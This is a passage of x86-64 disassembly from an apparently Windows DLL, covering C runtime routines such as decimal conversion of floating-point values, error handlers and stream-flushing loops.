   18000e7e6:	7e 26                	jle    0x18000e80e
   18000e7e8:	41 8b c8             	mov    %r8d,%ecx
   18000e7eb:	8b c6                	mov    %esi,%eax
   18000e7ed:	d1 ea                	shr    $1,%edx
   18000e7ef:	41 d1 e8             	shr    $1,%r8d
   18000e7f2:	c1 e0 1f             	shl    $0x1f,%eax
   18000e7f5:	c1 e1 1f             	shl    $0x1f,%ecx
   18000e7f8:	45 2b d3             	sub    %r11d,%r10d
   18000e7fb:	d1 ee                	shr    $1,%esi
   18000e7fd:	44 0b c0             	or     %eax,%r8d
   18000e800:	0b d1                	or     %ecx,%edx
   18000e802:	45 85 d2             	test   %r10d,%r10d
   18000e805:	7f e1                	jg     0x18000e7e8
   18000e807:	44 89 45 eb          	mov    %r8d,-0x15(%rbp)
   18000e80b:	89 55 e7             	mov    %edx,-0x19(%rbp)
   18000e80e:	45 8d 7e 01          	lea    0x1(%r14),%r15d
   18000e812:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   18000e816:	4c 8b d7             	mov    %rdi,%r10
   18000e819:	45 85 ff             	test   %r15d,%r15d
   18000e81c:	0f 8e d4 00 00 00    	jle    0x18000e8f6
   18000e822:	f2 0f 10 45 e7       	movsd  -0x19(%rbp),%xmm0
   18000e827:	41 8b c8             	mov    %r8d,%ecx
   18000e82a:	45 03 c0             	add    %r8d,%r8d
   18000e82d:	c1 e9 1f             	shr    $0x1f,%ecx
   18000e830:	8b c2                	mov    %edx,%eax
   18000e832:	03 d2                	add    %edx,%edx
   18000e834:	c1 e8 1f             	shr    $0x1f,%eax
   18000e837:	44 8d 0c 36          	lea    (%rsi,%rsi,1),%r9d
   18000e83b:	f2 0f 11 45 07       	movsd  %xmm0,0x7(%rbp)
   18000e840:	44 0b c0             	or     %eax,%r8d
   18000e843:	44 0b c9             	or     %ecx,%r9d
   18000e846:	8b c2                	mov    %edx,%eax
   18000e848:	41 8b c8             	mov    %r8d,%ecx
   18000e84b:	c1 e8 1f             	shr    $0x1f,%eax
   18000e84e:	45 03 c0             	add    %r8d,%r8d
   18000e851:	44 0b c0             	or     %eax,%r8d
   18000e854:	8b 45 07             	mov    0x7(%rbp),%eax
   18000e857:	03 d2                	add    %edx,%edx
   18000e859:	c1 e9 1f             	shr    $0x1f,%ecx
   18000e85c:	45 03 c9             	add    %r9d,%r9d
   18000e85f:	44 8d 24 10          	lea    (%rax,%rdx,1),%r12d
   18000e863:	44 0b c9             	or     %ecx,%r9d
   18000e866:	44 3b e2             	cmp    %edx,%r12d
   18000e869:	72 05                	jb     0x18000e870
   18000e86b:	44 3b e0             	cmp    %eax,%r12d
   18000e86e:	73 21                	jae    0x18000e891
   18000e870:	45 33 f6             	xor    %r14d,%r14d
   18000e873:	41 8d 40 01          	lea    0x1(%r8),%eax
   18000e877:	41 8b ce             	mov    %r14d,%ecx
   18000e87a:	41 3b c0             	cmp    %r8d,%eax
   18000e87d:	72 05                	jb     0x18000e884
   18000e87f:	41 3b c3             	cmp    %r11d,%eax
   18000e882:	73 03                	jae    0x18000e887
   18000e884:	41 8b cb             	mov    %r11d,%ecx
   18000e887:	44 8b c0             	mov    %eax,%r8d
   18000e88a:	85 c9                	test   %ecx,%ecx
   18000e88c:	74 03                	je     0x18000e891
   18000e88e:	45 03 cb             	add    %r11d,%r9d
   18000e891:	48 8b 45 07          	mov    0x7(%rbp),%rax
   18000e895:	48 c1 e8 20          	shr    $0x20,%rax
   18000e899:	45 8d 34 00          	lea    (%r8,%rax,1),%r14d
   18000e89d:	45 3b f0             	cmp    %r8d,%r14d
   18000e8a0:	72 05                	jb     0x18000e8a7
   18000e8a2:	44 3b f0             	cmp    %eax,%r14d
   18000e8a5:	73 03                	jae    0x18000e8aa
   18000e8a7:	45 03 cb             	add    %r11d,%r9d
   18000e8aa:	41 8b c4             	mov    %r12d,%eax
   18000e8ad:	44 03 ce             	add    %esi,%r9d
   18000e8b0:	43 8d 14 24          	lea    (%r12,%r12,1),%edx
   18000e8b4:	c1 e8 1f             	shr    $0x1f,%eax
   18000e8b7:	45 33 e4             	xor    %r12d,%r12d
   18000e8ba:	47 8d 04 36          	lea    (%r14,%r14,1),%r8d
   18000e8be:	44 0b c0             	or     %eax,%r8d
   18000e8c1:	41 8b ce             	mov    %r14d,%ecx
   18000e8c4:	43 8d 04 09          	lea    (%r9,%r9,1),%eax
   18000e8c8:	c1 e9 1f             	shr    $0x1f,%ecx
   18000e8cb:	45 2b fb             	sub    %r11d,%r15d
   18000e8ce:	89 55 e7             	mov    %edx,-0x19(%rbp)
   18000e8d1:	0b c1                	or     %ecx,%eax
   18000e8d3:	44 89 45 eb          	mov    %r8d,-0x15(%rbp)
   18000e8d7:	89 45 ef             	mov    %eax,-0x11(%rbp)
   18000e8da:	c1 e8 18             	shr    $0x18,%eax
   18000e8dd:	44 88 65 f2          	mov    %r12b,-0xe(%rbp)
   18000e8e1:	04 30                	add    $0x30,%al
   18000e8e3:	41 88 02             	mov    %al,(%r10)
   18000e8e6:	4d 03 d3             	add    %r11,%r10
   18000e8e9:	45 85 ff             	test   %r15d,%r15d
   18000e8ec:	7e 08                	jle    0x18000e8f6
   18000e8ee:	8b 75 ef             	mov    -0x11(%rbp),%esi
   18000e8f1:	e9 2c ff ff ff       	jmp    0x18000e822
   18000e8f6:	4d 2b d3             	sub    %r11,%r10
   18000e8f9:	41 8a 02             	mov    (%r10),%al
   18000e8fc:	4d 2b d3             	sub    %r11,%r10
   18000e8ff:	3c 35                	cmp    $0x35,%al
   18000e901:	7c 6a                	jl     0x18000e96d
   18000e903:	eb 0d                	jmp    0x18000e912
   18000e905:	41 80 3a 39          	cmpb   $0x39,(%r10)
   18000e909:	75 0c                	jne    0x18000e917
   18000e90b:	41 c6 02 30          	movb   $0x30,(%r10)
   18000e90f:	4d 2b d3             	sub    %r11,%r10
   18000e912:	4c 3b d7             	cmp    %rdi,%r10
   18000e915:	73 ee                	jae    0x18000e905
   18000e917:	4c 3b d7             	cmp    %rdi,%r10
   18000e91a:	73 07                	jae    0x18000e923
   18000e91c:	4d 03 d3             	add    %r11,%r10
   18000e91f:	66 44 01 1b          	add    %r11w,(%rbx)
   18000e923:	45 00 1a             	add    %r11b,(%r10)
   18000e926:	44 2a d3             	sub    %bl,%r10b
   18000e929:	41 80 ea 03          	sub    $0x3,%r10b
   18000e92d:	49 0f be c2          	movsbq %r10b,%rax
   18000e931:	44 88 53 03          	mov    %r10b,0x3(%rbx)
   18000e935:	44 88 64 18 04       	mov    %r12b,0x4(%rax,%rbx,1)
   18000e93a:	41 8b c3             	mov    %r11d,%eax
   18000e93d:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   18000e941:	48 33 cc             	xor    %rsp,%rcx
   18000e944:	e8 e7 68 ff ff       	call   0x180005230
   18000e949:	48 8b 9c 24 08 01 00 	mov    0x108(%rsp),%rbx
   18000e950:	00 
   18000e951:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   18000e958:	41 5f                	pop    %r15
   18000e95a:	41 5e                	pop    %r14
   18000e95c:	41 5d                	pop    %r13
   18000e95e:	41 5c                	pop    %r12
   18000e960:	5f                   	pop    %rdi
   18000e961:	5e                   	pop    %rsi
   18000e962:	5d                   	pop    %rbp
   18000e963:	c3                   	ret
   18000e964:	41 80 3a 30          	cmpb   $0x30,(%r10)
   18000e968:	75 08                	jne    0x18000e972
   18000e96a:	4d 2b d3             	sub    %r11,%r10
   18000e96d:	4c 3b d7             	cmp    %rdi,%r10
   18000e970:	73 f2                	jae    0x18000e964
   18000e972:	4c 3b d7             	cmp    %rdi,%r10
   18000e975:	73 af                	jae    0x18000e926
   18000e977:	b8 20 00 00 00       	mov    $0x20,%eax
   18000e97c:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   18000e982:	66 44 89 23          	mov    %r12w,(%rbx)
   18000e986:	66 44 39 4d 99       	cmp    %r9w,-0x67(%rbp)
   18000e98b:	8d 48 0d             	lea    0xd(%rax),%ecx
   18000e98e:	44 88 5b 03          	mov    %r11b,0x3(%rbx)
   18000e992:	0f 44 c1             	cmove  %ecx,%eax
   18000e995:	88 43 02             	mov    %al,0x2(%rbx)
   18000e998:	c6 07 30             	movb   $0x30,(%rdi)
   18000e99b:	e9 36 f6 ff ff       	jmp    0x18000dfd6
   18000e9a0:	45 33 c9             	xor    %r9d,%r9d
   18000e9a3:	45 33 c0             	xor    %r8d,%r8d
   18000e9a6:	33 d2                	xor    %edx,%edx
   18000e9a8:	33 c9                	xor    %ecx,%ecx
   18000e9aa:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   18000e9af:	e8 d0 8b ff ff       	call   0x180007584
   18000e9b4:	cc                   	int3
   18000e9b5:	45 33 c9             	xor    %r9d,%r9d
   18000e9b8:	45 33 c0             	xor    %r8d,%r8d
   18000e9bb:	33 d2                	xor    %edx,%edx
   18000e9bd:	33 c9                	xor    %ecx,%ecx
   18000e9bf:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   18000e9c4:	e8 bb 8b ff ff       	call   0x180007584
   18000e9c9:	cc                   	int3
   18000e9ca:	45 33 c9             	xor    %r9d,%r9d
   18000e9cd:	45 33 c0             	xor    %r8d,%r8d
   18000e9d0:	33 d2                	xor    %edx,%edx
   18000e9d2:	33 c9                	xor    %ecx,%ecx
   18000e9d4:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   18000e9d9:	e8 a6 8b ff ff       	call   0x180007584
   18000e9de:	cc                   	int3
   18000e9df:	45 33 c9             	xor    %r9d,%r9d
   18000e9e2:	45 33 c0             	xor    %r8d,%r8d
   18000e9e5:	33 d2                	xor    %edx,%edx
   18000e9e7:	33 c9                	xor    %ecx,%ecx
   18000e9e9:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   18000e9ee:	e8 91 8b ff ff       	call   0x180007584
   18000e9f3:	cc                   	int3
   18000e9f4:	48 83 ec 28          	sub    $0x28,%rsp
   18000e9f8:	48 85 c9             	test   %rcx,%rcx
   18000e9fb:	75 19                	jne    0x18000ea16
   18000e9fd:	e8 2e 8c ff ff       	call   0x180007630
   18000ea02:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000ea08:	e8 57 8b ff ff       	call   0x180007564
   18000ea0d:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000ea11:	48 83 c4 28          	add    $0x28,%rsp
   18000ea15:	c3                   	ret
   18000ea16:	4c 8b c1             	mov    %rcx,%r8
   18000ea19:	48 8b 0d 80 c3 00 00 	mov    0xc380(%rip),%rcx        # 0x18001ada0
   18000ea20:	33 d2                	xor    %edx,%edx
   18000ea22:	48 83 c4 28          	add    $0x28,%rsp
   18000ea26:	48 ff 25 eb 27 00 00 	rex.W jmp *0x27eb(%rip)        # 0x180011218
   18000ea2d:	cc                   	int3
   18000ea2e:	cc                   	int3
   18000ea2f:	cc                   	int3
   18000ea30:	48 83 ec 28          	sub    $0x28,%rsp
   18000ea34:	e8 67 c7 ff ff       	call   0x18000b1a0
   18000ea39:	48 85 c0             	test   %rax,%rax
   18000ea3c:	74 0a                	je     0x18000ea48
   18000ea3e:	b9 16 00 00 00       	mov    $0x16,%ecx
   18000ea43:	e8 88 c7 ff ff       	call   0x18000b1d0
   18000ea48:	f6 05 71 ba 00 00 02 	testb  $0x2,0xba71(%rip)        # 0x18001a4c0
   18000ea4f:	74 29                	je     0x18000ea7a
   18000ea51:	b9 17 00 00 00       	mov    $0x17,%ecx
   18000ea56:	e8 15 16 00 00       	call   0x180010070
   18000ea5b:	85 c0                	test   %eax,%eax
   18000ea5d:	74 07                	je     0x18000ea66
   18000ea5f:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000ea64:	cd 29                	int    $0x29
   18000ea66:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000ea6c:	ba 15 00 00 40       	mov    $0x40000015,%edx
   18000ea71:	41 8d 48 02          	lea    0x2(%r8),%ecx
   18000ea75:	e8 86 89 ff ff       	call   0x180007400
   18000ea7a:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000ea7f:	e8 f8 8e ff ff       	call   0x18000797c
   18000ea84:	cc                   	int3
   18000ea85:	cc                   	int3
   18000ea86:	cc                   	int3
   18000ea87:	cc                   	int3
   18000ea88:	48 83 ec 28          	sub    $0x28,%rsp
   18000ea8c:	48 85 c9             	test   %rcx,%rcx
   18000ea8f:	75 15                	jne    0x18000eaa6
   18000ea91:	e8 9a 8b ff ff       	call   0x180007630
   18000ea96:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000ea9c:	e8 c3 8a ff ff       	call   0x180007564
   18000eaa1:	83 c8 ff             	or     $0xffffffff,%eax
   18000eaa4:	eb 03                	jmp    0x18000eaa9
   18000eaa6:	8b 41 1c             	mov    0x1c(%rcx),%eax
   18000eaa9:	48 83 c4 28          	add    $0x28,%rsp
   18000eaad:	c3                   	ret
   18000eaae:	cc                   	int3
   18000eaaf:	cc                   	int3
   18000eab0:	48 83 ec 28          	sub    $0x28,%rsp
   18000eab4:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   18000eab7:	75 0d                	jne    0x18000eac6
   18000eab9:	e8 72 8b ff ff       	call   0x180007630
   18000eabe:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000eac4:	eb 42                	jmp    0x18000eb08
   18000eac6:	85 c9                	test   %ecx,%ecx
   18000eac8:	78 2e                	js     0x18000eaf8
   18000eaca:	3b 0d d8 e0 00 00    	cmp    0xe0d8(%rip),%ecx        # 0x18001cba8
   18000ead0:	73 26                	jae    0x18000eaf8
   18000ead2:	48 63 c9             	movslq %ecx,%rcx
   18000ead5:	48 8d 15 a4 c9 00 00 	lea    0xc9a4(%rip),%rdx        # 0x18001b480
   18000eadc:	48 8b c1             	mov    %rcx,%rax
   18000eadf:	83 e1 1f             	and    $0x1f,%ecx
   18000eae2:	48 c1 f8 05          	sar    $0x5,%rax
   18000eae6:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   18000eaea:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   18000eaee:	0f be 44 08 08       	movsbl 0x8(%rax,%rcx,1),%eax
   18000eaf3:	83 e0 40             	and    $0x40,%eax
   18000eaf6:	eb 12                	jmp    0x18000eb0a
   18000eaf8:	e8 33 8b ff ff       	call   0x180007630
   18000eafd:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000eb03:	e8 5c 8a ff ff       	call   0x180007564
   18000eb08:	33 c0                	xor    %eax,%eax
   18000eb0a:	48 83 c4 28          	add    $0x28,%rsp
   18000eb0e:	c3                   	ret
   18000eb0f:	cc                   	int3
   18000eb10:	40 53                	rex push %rbx
   18000eb12:	48 83 ec 20          	sub    $0x20,%rsp
   18000eb16:	48 8b d9             	mov    %rcx,%rbx
   18000eb19:	48 85 c9             	test   %rcx,%rcx
   18000eb1c:	75 0a                	jne    0x18000eb28
   18000eb1e:	48 83 c4 20          	add    $0x20,%rsp
   18000eb22:	5b                   	pop    %rbx
   18000eb23:	e9 bc 00 00 00       	jmp    0x18000ebe4
   18000eb28:	e8 2f 00 00 00       	call   0x18000eb5c
   18000eb2d:	85 c0                	test   %eax,%eax
   18000eb2f:	74 05                	je     0x18000eb36
   18000eb31:	83 c8 ff             	or     $0xffffffff,%eax
   18000eb34:	eb 20                	jmp    0x18000eb56
   18000eb36:	f7 43 18 00 40 00 00 	testl  $0x4000,0x18(%rbx)
   18000eb3d:	74 15                	je     0x18000eb54
   18000eb3f:	48 8b cb             	mov    %rbx,%rcx
   18000eb42:	e8 41 ff ff ff       	call   0x18000ea88
   18000eb47:	8b c8                	mov    %eax,%ecx
   18000eb49:	e8 4a 04 00 00       	call   0x18000ef98
   18000eb4e:	f7 d8                	neg    %eax
   18000eb50:	1b c0                	sbb    %eax,%eax
   18000eb52:	eb 02                	jmp    0x18000eb56
   18000eb54:	33 c0                	xor    %eax,%eax
   18000eb56:	48 83 c4 20          	add    $0x20,%rsp
   18000eb5a:	5b                   	pop    %rbx
   18000eb5b:	c3                   	ret
   18000eb5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000eb61:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000eb66:	57                   	push   %rdi
   18000eb67:	48 83 ec 20          	sub    $0x20,%rsp
   18000eb6b:	8b 41 18             	mov    0x18(%rcx),%eax
   18000eb6e:	33 f6                	xor    %esi,%esi
   18000eb70:	48 8b d9             	mov    %rcx,%rbx
   18000eb73:	24 03                	and    $0x3,%al
   18000eb75:	3c 02                	cmp    $0x2,%al
   18000eb77:	75 3f                	jne    0x18000ebb8
   18000eb79:	f7 41 18 08 01 00 00 	testl  $0x108,0x18(%rcx)
   18000eb80:	74 36                	je     0x18000ebb8
   18000eb82:	8b 39                	mov    (%rcx),%edi
   18000eb84:	2b 79 10             	sub    0x10(%rcx),%edi
   18000eb87:	85 ff                	test   %edi,%edi
   18000eb89:	7e 2d                	jle    0x18000ebb8
   18000eb8b:	e8 f8 fe ff ff       	call   0x18000ea88
   18000eb90:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   18000eb94:	44 8b c7             	mov    %edi,%r8d
   18000eb97:	8b c8                	mov    %eax,%ecx
   18000eb99:	e8 d2 04 00 00       	call   0x18000f070
   18000eb9e:	3b c7                	cmp    %edi,%eax
   18000eba0:	75 0f                	jne    0x18000ebb1
   18000eba2:	8b 43 18             	mov    0x18(%rbx),%eax
   18000eba5:	84 c0                	test   %al,%al
   18000eba7:	79 0f                	jns    0x18000ebb8
   18000eba9:	83 e0 fd             	and    $0xfffffffd,%eax
   18000ebac:	89 43 18             	mov    %eax,0x18(%rbx)
   18000ebaf:	eb 07                	jmp    0x18000ebb8
   18000ebb1:	83 4b 18 20          	orl    $0x20,0x18(%rbx)
   18000ebb5:	83 ce ff             	or     $0xffffffff,%esi
   18000ebb8:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   18000ebbc:	83 63 08 00          	andl   $0x0,0x8(%rbx)
   18000ebc0:	8b c6                	mov    %esi,%eax
   18000ebc2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000ebc7:	48 89 0b             	mov    %rcx,(%rbx)
   18000ebca:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ebcf:	48 83 c4 20          	add    $0x20,%rsp
   18000ebd3:	5f                   	pop    %rdi
   18000ebd4:	c3                   	ret
   18000ebd5:	cc                   	int3
   18000ebd6:	cc                   	int3
   18000ebd7:	cc                   	int3
   18000ebd8:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000ebdd:	e9 02 00 00 00       	jmp    0x18000ebe4
   18000ebe2:	cc                   	int3
   18000ebe3:	cc                   	int3
   18000ebe4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ebe9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000ebee:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000ebf3:	41 55                	push   %r13
   18000ebf5:	41 56                	push   %r14
   18000ebf7:	41 57                	push   %r15
   18000ebf9:	48 83 ec 30          	sub    $0x30,%rsp
   18000ebfd:	44 8b f1             	mov    %ecx,%r14d
   18000ec00:	33 f6                	xor    %esi,%esi
   18000ec02:	33 ff                	xor    %edi,%edi
   18000ec04:	8d 4e 01             	lea    0x1(%rsi),%ecx
   18000ec07:	e8 00 c1 ff ff       	call   0x18000ad0c
   18000ec0c:	90                   	nop
   18000ec0d:	33 db                	xor    %ebx,%ebx
   18000ec0f:	41 83 cd ff          	or     $0xffffffff,%r13d
   18000ec13:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   18000ec17:	3b 1d 43 ce 00 00    	cmp    0xce43(%rip),%ebx        # 0x18001ba60
   18000ec1d:	7d 7e                	jge    0x18000ec9d
   18000ec1f:	4c 63 fb             	movslq %ebx,%r15
   18000ec22:	48 8b 05 2f ce 00 00 	mov    0xce2f(%rip),%rax        # 0x18001ba58
   18000ec29:	4a 8b 14 f8          	mov    (%rax,%r15,8),%rdx
   18000ec2d:	48 85 d2             	test   %rdx,%rdx
   18000ec30:	74 64                	je     0x18000ec96
   18000ec32:	f6 42 18 83          	testb  $0x83,0x18(%rdx)
   18000ec36:	74 5e                	je     0x18000ec96
   18000ec38:	8b cb                	mov    %ebx,%ecx
   18000ec3a:	e8 65 dc ff ff       	call   0x18000c8a4
   18000ec3f:	90                   	nop
   18000ec40:	48 8b 05 11 ce 00 00 	mov    0xce11(%rip),%rax        # 0x18001ba58
   18000ec47:	4a 8b 0c f8          	mov    (%rax,%r15,8),%rcx
   18000ec4b:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   18000ec4f:	74 33                	je     0x18000ec84
   18000ec51:	41 83 fe 01          	cmp    $0x1,%r14d
   18000ec55:	75 12                	jne    0x18000ec69
   18000ec57:	e8 b4 fe ff ff       	call   0x18000eb10
   18000ec5c:	41 3b c5             	cmp    %r13d,%eax
   18000ec5f:	74 23                	je     0x18000ec84
   18000ec61:	ff c6                	inc    %esi
   18000ec63:	89 74 24 24          	mov    %esi,0x24(%rsp)
   18000ec67:	eb 1b                	jmp    0x18000ec84
   18000ec69:	45 85 f6             	test   %r14d,%r14d
   18000ec6c:	75 16                	jne    0x18000ec84
   18000ec6e:	f6 41 18 02          	testb  $0x2,0x18(%rcx)
   18000ec72:	74 10                	je     0x18000ec84
   18000ec74:	e8 97 fe ff ff       	call   0x18000eb10
   18000ec79:	41 3b c5             	cmp    %r13d,%eax
   18000ec7c:	41 0f 44 fd          	cmove  %r13d,%edi
   18000ec80:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   18000ec84:	48 8b 15 cd cd 00 00 	mov    0xcdcd(%rip),%rdx        # 0x18001ba58
   18000ec8b:	4a 8b 14 fa          	mov    (%rdx,%r15,8),%rdx
   18000ec8f:	8b cb                	mov    %ebx,%ecx
   18000ec91:	e8 92 dc ff ff       	call   0x18000c928
   18000ec96:	ff c3                	inc    %ebx
   18000ec98:	e9 76 ff ff ff       	jmp    0x18000ec13
   18000ec9d:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000eca2:	e8 55 c2 ff ff       	call   0x18000aefc
   18000eca7:	41 83 fe 01          	cmp    $0x1,%r14d
   18000ecab:	0f 44 fe             	cmove  %esi,%edi
   18000ecae:	8b c7                	mov    %edi,%eax
   18000ecb0:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000ecb5:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   18000ecba:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   18000ecbf:	48 83 c4 30          	add    $0x30,%rsp
   18000ecc3:	41 5f                	pop    %r15
   18000ecc5:	41 5e                	pop    %r14
   18000ecc7:	41 5d                	pop    %r13
   18000ecc9:	c3                   	ret
   18000ecca:	cc                   	int3
   18000eccb:	cc                   	int3
   18000eccc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ecd1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000ecd6:	57                   	push   %rdi
   18000ecd7:	48 83 ec 30          	sub    $0x30,%rsp
   18000ecdb:	33 ff                	xor    %edi,%edi
   18000ecdd:	8d 4f 01             	lea    0x1(%rdi),%ecx
   18000ece0:	e8 27 c0 ff ff       	call   0x18000ad0c
   18000ece5:	90                   	nop
   18000ece6:	8d 5f 03             	lea    0x3(%rdi),%ebx
   18000ece9:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   18000eced:	3b 1d 6d cd 00 00    	cmp    0xcd6d(%rip),%ebx        # 0x18001ba60
   18000ecf3:	7d 63                	jge    0x18000ed58
   18000ecf5:	48 63 f3             	movslq %ebx,%rsi
   18000ecf8:	48 8b 05 59 cd 00 00 	mov    0xcd59(%rip),%rax        # 0x18001ba58
   18000ecff:	48 8b 0c f0          	mov    (%rax,%rsi,8),%rcx
   18000ed03:	48 85 c9             	test   %rcx,%rcx
   18000ed06:	74 4c                	je     0x18000ed54
   18000ed08:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   18000ed0c:	74 10                	je     0x18000ed1e
   18000ed0e:	e8 b1 0c 00 00       	call   0x18000f9c4
   18000ed13:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000ed16:	74 06                	je     0x18000ed1e
   18000ed18:	ff c7                	inc    %edi
   18000ed1a:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   18000ed1e:	83 fb 14             	cmp    $0x14,%ebx
   18000ed21:	7c 31                	jl     0x18000ed54
   18000ed23:	48 8b 05 2e cd 00 00 	mov    0xcd2e(%rip),%rax        # 0x18001ba58
   18000ed2a:	48 8b 0c f0          	mov    (%rax,%rsi,8),%rcx
   18000ed2e:	48 83 c1 30          	add    $0x30,%rcx
   18000ed32:	ff 15 f8 23 00 00    	call   *0x23f8(%rip)        # 0x180011130
   18000ed38:	48 8b 0d 19 cd 00 00 	mov    0xcd19(%rip),%rcx        # 0x18001ba58
   18000ed3f:	48 8b 0c f1          	mov    (%rcx,%rsi,8),%rcx
   18000ed43:	e8 38 68 ff ff       	call   0x180005580
   18000ed48:	48 8b 05 09 cd 00 00 	mov    0xcd09(%rip),%rax        # 0x18001ba58
   18000ed4f:	48 83 24 f0 00       	andq   $0x0,(%rax,%rsi,8)
   18000ed54:	ff c3                	inc    %ebx
   18000ed56:	eb 91                	jmp    0x18000ece9
   18000ed58:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000ed5d:	e8 9a c1 ff ff       	call   0x18000aefc
   18000ed62:	8b c7                	mov    %edi,%eax
   18000ed64:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000ed69:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000ed6e:	48 83 c4 30          	add    $0x30,%rsp
   18000ed72:	5f                   	pop    %rdi
   18000ed73:	c3                   	ret
   18000ed74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ed79:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000ed7e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000ed83:	57                   	push   %rdi
   18000ed84:	41 54                	push   %r12
   18000ed86:	41 56                	push   %r14
   18000ed88:	48 83 ec 10          	sub    $0x10,%rsp
   18000ed8c:	41 83 20 00          	andl   $0x0,(%r8)
   18000ed90:	41 83 60 04 00       	andl   $0x0,0x4(%r8)
   18000ed95:	41 83 60 08 00       	andl   $0x0,0x8(%r8)
   18000ed9a:	4d 8b d0             	mov    %r8,%r10
   18000ed9d:	8b fa                	mov    %edx,%edi
   18000ed9f:	48 8b e9             	mov    %rcx,%rbp
   18000eda2:	bb 4e 40 00 00       	mov    $0x404e,%ebx
   18000eda7:	85 d2                	test   %edx,%edx
   18000eda9:	0f 84 41 01 00 00    	je     0x18000eef0
   18000edaf:	45 33 db             	xor    %r11d,%r11d
   18000edb2:	45 33 c0             	xor    %r8d,%r8d
   18000edb5:	45 33 c9             	xor    %r9d,%r9d
   18000edb8:	45 8d 63 01          	lea    0x1(%r11),%r12d
   18000edbc:	f2 41 0f 10 02       	movsd  (%r10),%xmm0
   18000edc1:	45 8b 72 08          	mov    0x8(%r10),%r14d
   18000edc5:	41 8b c8             	mov    %r8d,%ecx
   18000edc8:	c1 e9 1f             	shr    $0x1f,%ecx
   18000edcb:	45 03 c0             	add    %r8d,%r8d
   18000edce:	45 03 c9             	add    %r9d,%r9d
   18000edd1:	f2 0f 11 04 24       	movsd  %xmm0,(%rsp)
   18000edd6:	44 0b c9             	or     %ecx,%r9d
   18000edd9:	43 8d 14 1b          	lea    (%r11,%r11,1),%edx
   18000eddd:	41 8b c3             	mov    %r11d,%eax
   18000ede0:	c1 e8 1f             	shr    $0x1f,%eax
   18000ede3:	45 03 c9             	add    %r9d,%r9d
   18000ede6:	44 0b c0             	or     %eax,%r8d
   18000ede9:	8b c2                	mov    %edx,%eax
   18000edeb:	03 d2                	add    %edx,%edx
   18000eded:	41 8b c8             	mov    %r8d,%ecx
   18000edf0:	c1 e8 1f             	shr    $0x1f,%eax
   18000edf3:	45 03 c0             	add    %r8d,%r8d
   18000edf6:	c1 e9 1f             	shr    $0x1f,%ecx
   18000edf9:	44 0b c0             	or     %eax,%r8d
   18000edfc:	33 c0                	xor    %eax,%eax
   18000edfe:	44 0b c9             	or     %ecx,%r9d
   18000ee01:	8b 0c 24             	mov    (%rsp),%ecx
   18000ee04:	41 89 12             	mov    %edx,(%r10)
   18000ee07:	8d 34 0a             	lea    (%rdx,%rcx,1),%esi
   18000ee0a:	45 89 42 04          	mov    %r8d,0x4(%r10)
   18000ee0e:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   18000ee12:	3b f2                	cmp    %edx,%esi
   18000ee14:	72 04                	jb     0x18000ee1a
   18000ee16:	3b f1                	cmp    %ecx,%esi
   18000ee18:	73 03                	jae    0x18000ee1d
   18000ee1a:	41 8b c4             	mov    %r12d,%eax
   18000ee1d:	41 89 32             	mov    %esi,(%r10)
   18000ee20:	85 c0                	test   %eax,%eax
   18000ee22:	74 24                	je     0x18000ee48
   18000ee24:	41 8b c0             	mov    %r8d,%eax
   18000ee27:	41 ff c0             	inc    %r8d
   18000ee2a:	33 c9                	xor    %ecx,%ecx
   18000ee2c:	44 3b c0             	cmp    %eax,%r8d
   18000ee2f:	72 05                	jb     0x18000ee36
   18000ee31:	45 3b c4             	cmp    %r12d,%r8d
   18000ee34:	73 03                	jae    0x18000ee39
   18000ee36:	41 8b cc             	mov    %r12d,%ecx
   18000ee39:	45 89 42 04          	mov    %r8d,0x4(%r10)
   18000ee3d:	85 c9                	test   %ecx,%ecx
   18000ee3f:	74 07                	je     0x18000ee48
   18000ee41:	41 ff c1             	inc    %r9d
